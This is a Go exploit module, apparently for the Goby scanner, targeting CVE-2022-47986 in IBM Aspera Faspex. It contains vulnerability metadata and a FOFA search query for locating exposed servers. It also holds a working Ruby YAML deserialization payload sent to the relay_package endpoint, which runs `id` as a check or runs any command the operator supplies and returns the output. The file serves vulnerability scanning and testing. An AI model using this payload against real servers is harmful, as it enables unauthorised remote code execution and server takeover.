package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Aspera Faspex relay_package RCE Vulnerability(CVE-2022-47986)",
    "Description": "<p>Aspera Faspex is a set of fast file transfer and streaming solutions based on the IBM FASP protocol built by IBM Corporation of the United States.</p><p>There is a security vulnerability in Aspera Faspex. The vulnerability stems from the lack of security check in the /package_relay/relay_package path. Attackers can use this vulnerability to execute arbitrary code to obtain server permissions.</p>",
    "Product": "Aspera-Faspex",
    "Homepage": "https://www.ibm.com/products/aspera",
    "DisclosureDate": "2023-02-03",
    "Author": "xiaoheihei1107@gmail.com",
    "FofaQuery": "title=\"Aspera-Faspex\"",
    "GobyQuery": "title=\"Aspera-Faspex\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in Aspera Faspex. The vulnerability stems from the lack of security check in the /package_relay/relay_package path. Attackers can use this vulnerability to execute arbitrary code to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.ibm.com/products/aspera.\">https://www.ibm.com/products/aspera.</a></p>",
    "References": [
        "https://blog.assetnote.io/2023/02/02/pre-auth-rce-aspera-faspex/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2022-47986"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Aspera Faspex relay_package 远程代码执行漏洞（CVE-2022-47986）",
            "Product": "Aspera-Faspex",
            "Description": "<p>Aspera Faspex是美国IBM公司的一套基于IBM FASP协议构建的快速文件传输和流解决方案。<br></p><p>Aspera Faspex 存在安全漏洞，该漏洞源于/package_relay/relay_package路径下没有安全校验，攻击者可利用该漏洞执行任意代码获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.ibm.com/products/aspera\">https://www.ibm.com/products/aspera</a>。<br></p>",
            "Impact": "<p>Aspera Faspex 存在安全漏洞，该漏洞源于/package_relay/relay_package路径下没有安全校验，攻击者可利用该漏洞执行任意代码获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Aspera Faspex relay_package RCE Vulnerability(CVE-2022-47986)",
            "Product": "Aspera-Faspex",
            "Description": "<p>Aspera Faspex is a set of fast file transfer and streaming solutions based on the IBM FASP protocol built by IBM Corporation of the United States.<br></p><p>There is a security vulnerability in Aspera Faspex. The vulnerability stems from the lack of security check in the /package_relay/relay_package path. Attackers can use this vulnerability to execute arbitrary code to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.ibm.com/products/aspera.\">https://www.ibm.com/products/aspera.</a><br></p>",
            "Impact": "<p>There is a security vulnerability in Aspera Faspex. The vulnerability stems from the lack of security check in the /package_relay/relay_package path. Attackers can use this vulnerability to execute arbitrary code to obtain server permissions.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10714"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/aspera/faspex/package_relay/relay_package"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = "{\"package_file_list\": [\"/\"], \"external_emails\": \"\\n---\\n- !ruby/object:Gem::Installer\\n    i: x\\n- !ruby/object:Gem::SpecFetcher\\n    i: y\\n- !ruby/object:Gem::Requirement\\n  requirements:\\n    !ruby/object:Gem::Package::TarReader\\n    io: &1 !ruby/object:Net::BufferedIO\\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n         read: 0\\n         header: \\\"pew\\\"\\n      debug_output: &1 !ruby/object:Net::WriteAdapter\\n         socket: &1 !ruby/object:PrettyPrint\\n             output: !ruby/object:Net::WriteAdapter\\n                 socket: &1 !ruby/module \\\"Kernel\\\"\\n                 method_id: :eval\\n             newline: \\\"throw `id`\\\"\\n             buffer: {}\\n             group_stack:\\n              - !ruby/object:PrettyPrint::Group\\n                break: true\\n         method_id: :breakable\\n\", \"package_name\": \"assetnote_pack\", \"package_note\": \"hello from assetnote team\", \"original_sender_name\": \"assetnote\", \"package_uuid\": \"d7cb6601-6db9-43aa-8e6b-dfb4768647ec\", \"metadata_human_readable\": \"Yes\", \"forward\": \"pew\", \"metadata_json\": \"{}\", \"delivery_uuid\": \"d7cb6601-6db9-43aa-8e6b-dfb4768647ec\", \"delivery_sender_name\": \"assetnote\", \"delivery_title\": \"TEST\", \"delivery_note\": \"TEST\", \"delete_after_download\": true, \"delete_after_download_condition\": \"IDK\"}"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 500 && strings.Contains(resp.RawBody, "uid") && strings.Contains(resp.RawBody, "gid")

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/aspera/faspex/package_relay/relay_package"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf("{\"package_file_list\": [\"/\"], \"external_emails\": \"\\n---\\n- !ruby/object:Gem::Installer\\n    i: x\\n- !ruby/object:Gem::SpecFetcher\\n    i: y\\n- !ruby/object:Gem::Requirement\\n  requirements:\\n    !ruby/object:Gem::Package::TarReader\\n    io: &1 !ruby/object:Net::BufferedIO\\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n         read: 0\\n         header: \\\"pew\\\"\\n      debug_output: &1 !ruby/object:Net::WriteAdapter\\n         socket: &1 !ruby/object:PrettyPrint\\n             output: !ruby/object:Net::WriteAdapter\\n                 socket: &1 !ruby/module \\\"Kernel\\\"\\n                 method_id: :eval\\n             newline: \\\"throw `%s`\\\"\\n             buffer: {}\\n             group_stack:\\n              - !ruby/object:PrettyPrint::Group\\n                break: true\\n         method_id: :breakable\\n\", \"package_name\": \"assetnote_pack\", \"package_note\": \"hello from assetnote team\", \"original_sender_name\": \"assetnote\", \"package_uuid\": \"d7cb6601-6db9-43aa-8e6b-dfb4768647ec\", \"metadata_human_readable\": \"Yes\", \"forward\": \"pew\", \"metadata_json\": \"{}\", \"delivery_uuid\": \"d7cb6601-6db9-43aa-8e6b-dfb4768647ec\", \"delivery_sender_name\": \"assetnote\", \"delivery_title\": \"TEST\", \"delivery_note\": \"TEST\", \"delete_after_download\": true, \"delete_after_download_condition\": \"IDK\"}",cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 500 {
				expResult.Output = resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}
